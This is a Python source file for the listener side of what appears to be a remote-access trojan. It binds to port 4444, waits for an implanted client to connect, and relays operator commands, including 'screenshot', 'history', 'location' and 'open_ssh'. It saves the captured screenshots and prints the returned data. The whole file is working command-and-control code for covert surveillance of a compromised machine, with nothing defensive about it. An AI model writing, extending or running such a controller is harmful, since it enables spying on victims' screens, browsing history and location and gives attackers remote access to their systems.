import socket
import time
import curses

def loading_screen(stdscr):
    stdscr.clear()
    curses.start_color()
    curses.init_pair(1, curses.COLOR_WHITE, curses.COLOR_MAGENTA)
    stdscr.attron(curses.color_pair(1))
    stdscr.addstr(0, 0, "Loading... Establishing connection...\n")
    stdscr.addstr(1, 0, "Please wait...\n")
    stdscr.attroff(curses.color_pair(1))
    stdscr.refresh()
    time.sleep(3)

def start_server(host='0.0.0.0', port=4444):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((host, port))
    server.listen(1)
    print(f"[+] Listening on {host}:{port}")
    
    client, addr = server.accept()
    print(f"[+] Connection from {addr}")
    
    curses.wrapper(loading_screen)  # Start the loading screen
    
    while True:
        command = input(">> ").strip()
        if not command:
            continue

        client.send(command.encode())

        if command == 'exit':
            client.close()
            break
        elif command.startswith('screenshot') or command.startswith('history') or command == 'location' or command == 'open_ssh':
            length = int.from_bytes(client.recv(8), 'big')
            data = b''
            while len(data) < length:
                packet = client.recv(4096)
                if not packet:
                    break
                data += packet

            if command == 'screenshot':
                with open('received_screenshot.png', 'wb') as f:
                    f.write(data)
                print("[+] Screenshot saved as received_screenshot.png")
            elif command == 'location':
                print(data.decode(errors='ignore'))
            else:
                print(data.decode(errors='ignore'))
        else:
            result = client.recv(4096).decode(errors='ignore')
            print(result)

start_server()
